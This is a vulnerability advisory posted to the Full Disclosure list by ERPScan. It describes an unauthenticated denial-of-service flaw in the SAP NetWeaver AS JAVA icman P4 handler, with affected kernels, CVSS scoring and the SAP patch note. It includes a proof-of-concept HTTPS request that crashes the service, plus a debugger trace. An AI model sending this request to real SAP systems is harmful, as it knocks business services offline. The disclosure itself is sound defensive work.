
Date: Mon, 21 Nov 2016 11:47:59 +0300
From: ERPScan inc <erpscan.online@...il.com>
To: submissions@...ketstormsecurity.com, fulldisclosure@...lists.org, 
 pen-test@...urityfocus.com, bugs@...uritytracker.com, 
 bugtraq@...urityfocus.com
Subject: [FD] [ERPSCAN-16-033] SAP NetWeaver AS JAVA icman - DoS
	vulnerability

Application: SAP NetWeaver AS JAVA

Versions Affected: SAP NetWeaver AS JAVA 7.4

Vendor URL: http://SAP.com

Bug: Denial of Service

Sent: 22.04.2016

Reported: 23.04.2016

Vendor response: 23.04.2016

Date of Public Advisory: 09.08.2016

Reference: SAP Security Note  2313835

Author: Vahagn Vardanyan (ERPScan)



Description



1. ADVISORY INFORMATION

Title:  [ERPSCAN-16-033] SAP NetWeaver AS JAVA icman – DoS vulnerability

Advisory ID:[ERPSCAN-16-033]

Risk: high

Advisory URL: https://erpscan.com/advisories/erpscan-16-033-sap-netweaver-java-icman-dos-vulnerability/

Date published: 11.11.2016

Vendors contacted: SAP


2. VULNERABILITY INFORMATION

Class: Denial of Service

Impact: Denial of Service

Remotely Exploitable: yes

Locally Exploitable: yes


CVSS Information

CVSS Base Score v3:   7.5 / 10

CVSS Base Vector:

AV : Attack Vector (Related exploit range) Network (N)

AC : Attack Complexity (Required attack complexity) Low (L)

PR : Privileges Required (Level of privileges needed to exploit) None (N)

UI : User Interaction (Required user participation) None (N)

S : Scope (Change in scope due to impact caused to components beyond
the vulnerable component) Unchanged (U)

C : Impact to Confidentiality None (N)

I : Impact to Integrity None (N)

A : Impact to Availability High (H)



3. VULNERABILITY DESCRIPTION

Unauthenticated attacker can make DoS attack with use P4 over HTTPS


4. VULNERABLE PACKAGES

SAP KERNEL 7.21 32-BIT

SAP KERNEL 7.21 32-BIT UNICODE

SAP KERNEL 7.21 64-BIT

SAP KERNEL 7.21 64-BIT UNICODE

SAP KERNEL 7.21 EXT 32-BIT

SAP KERNEL 7.21 EXT 32-BIT UC

SAP KERNEL 7.21 EXT 64-BIT

SAP KERNEL 7.21 EXT 64-BIT UC

SAP KERNEL 7.22 64-BIT

SAP KERNEL 7.22 64-BIT UNICODE

SAP KERNEL 7.22 EXT 64-BIT

SAP KERNEL 7.22 EXT 64-BIT UC

SAP KERNEL 7.42 64-BIT

SAP KERNEL 7.42 64-BIT UNICODE

SAP KERNEL 7.45 64-BIT

SAP KERNEL 7.45 64-BIT UNICODE



5. SOLUTIONS AND WORKAROUNDS

To correct this vulnerability, install SAP Security Note  2313835



6. AUTHOR

 Vahagn Vardanyan (ERPScan)



7. TECHNICAL DESCRIPTION

Vulnerability triggers when one sends HTTPS GET request to SAP NetWeaver P4.


PoC

```

GET https://SAP_IP:50005/sap.com~P4TunnelingApp!web/myServlet HTTP/1.1

Host: 172.16.10.65:50005

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0)
Gecko/20100101 Firefox/33.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

```

```

0:007> r

rax=0000a323260f1252 rbx=0000000025c500d0 rcx=0000000025c500d0

rdx=0000000000000001 rsi=0000000000000002 rdi=0000000000000000

rip=000000013f3af019 rsp=0000000003500d40 rbp=0000000003500e40

r8=0000000025c50400  r9=0000006c004c0002 r10=0000000003500c20

r11=00000000021b2df0 r12=0000000000000002 r13=000000013f2c0000

r14=0000000000000000 r15=0000000000000001

iopl=0         nv up ei ng nz ac po cy

cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010297

icman!P4PlugInReadHandler+0xb9:

00000001`3f3af019 8b4f04          mov     ecx,dword ptr [rdi+4]
ds:00000000`00000004=????????


00000000`03500d40 00000001`3f363fb5 icman!P4PlugInReadHandler+0xb9
[d:\depot\bas\742_rel\src\krn\si\ic\p4_plg.c @ 1192]

00000000`03500ec0 00000001`3f3638ea icman!IcmMplxAsyncReadDone+0x75
[d:\depot\bas\742_rel\src\krn\si\ic\icxxmplx.c @ 5088]

00000000`03500f10 00000001`3f362626 icman!IcmMplxExecCall+0x36a
[d:\depot\bas\742_rel\src\krn\si\ic\icxxmplx.c @ 4808]

00000000`0350fd20 00000000`74901d9f icman!IcmMplxThread+0x5f6
[d:\depot\bas\742_rel\src\krn\si\ic\icxxmplx.c @ 3840]

00000000`0350fdb0 00000000`74901e3b MSVCR100!endthreadex+0x43

00000000`0350fde0 00000000`7716652d MSVCR100!endthreadex+0xdf

00000000`0350fe10 00000000`7729c541 kernel32!BaseThreadInitThunk+0xd

00000000`0350fe40 00000000`00000000 ntdll!RtlUserThreadStart+0x21

```


8. REPORT TIMELINE

Sent: 22.04.2016

Reported: 23.04.2016

Vendor response: 23.04.2016

Date of Public Advisory: 09.08.2016



9. REFERENCES

https://erpscan.com/advisories/erpscan-16-033-sap-netweaver-java-icman-dos-vulnerability/



10. ABOUT ERPScan Research

ERPScan research team specializes in vulnerability research and
analysis of critical enterprise applications. It was acknowledged
multiple times by the largest software vendors like SAP, Oracle,
Microsoft, IBM, VMware, HP for discovering more than 400
vulnerabilities in their solutions (200 of them just in SAP!).

ERPScan researchers are proud of discovering new types of
vulnerabilities (TOP 10 Web Hacking Techniques 2012) and of the "The
Best Server-Side Bug" nomination at BlackHat 2013.

ERPScan experts participated as speakers, presenters, and trainers at
60+ prime international security conferences in 25+ countries across
the continents ( e.g. BlackHat, RSA, HITB) and conducted private
trainings for several Fortune 2000 companies.

ERPScan researchers carry out the EAS-SEC project that is focused on
enterprise application security awareness by issuing annual SAP
security researches.

ERPScan experts were interviewed in specialized infosec resources and
featured in major media worldwide. Among them, there are Reuters,
Yahoo, SC Magazine, The Register, CIO, PC World, DarkReading, Heise,
Chinabyte, etc.

Our team consists of highly-qualified researchers, specialized in
various fields of cybersecurity (from web application to ICS/SCADA
systems), gathering their experience to conduct the best SAP security
research.

11. ABOUT ERPScan

ERPScan is the most respected and credible Business Application
Cybersecurity provider. Founded in 2010, the company operates globally
and enables large Oil and Gas, Financial, Retail and other
organizations to secure their mission-critical processes. Named as an
‘Emerging Vendor’ in Security by CRN, listed among “TOP 100 SAP
Solution providers” and distinguished by 30+ other awards, ERPScan is
the leading SAP SE partner in discovering and resolving security
vulnerabilities. ERPScan consultants work with SAP SE in Walldorf to
assist in improving the security of their latest solutions.

ERPScan’s primary mission is to close the gap between technical and
business security and provide solutions for CISO's to evaluate and
secure SAP and Oracle ERP systems and business-critical applications
from both cyberattacks and internal fraud. As a rule, our clients are
large enterprises, Fortune 2000 companies and MSPs, whose requirements
are to actively monitor and manage security of vast SAP and Oracle
landscapes on a global scale.

We ‘follow the sun’ and have two hubs, located in Palo Alto and
Amsterdam, to provide threat intelligence services, continuous support
and to operate local offices and partner network spanning 20+
countries around the globe.



Adress USA: 228 Hamilton Avenue, Fl. 3, Palo Alto, CA. 94301

Phone: 650.798.5255

Twitter: @erpscan

Scoop-it: Business Application Security

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/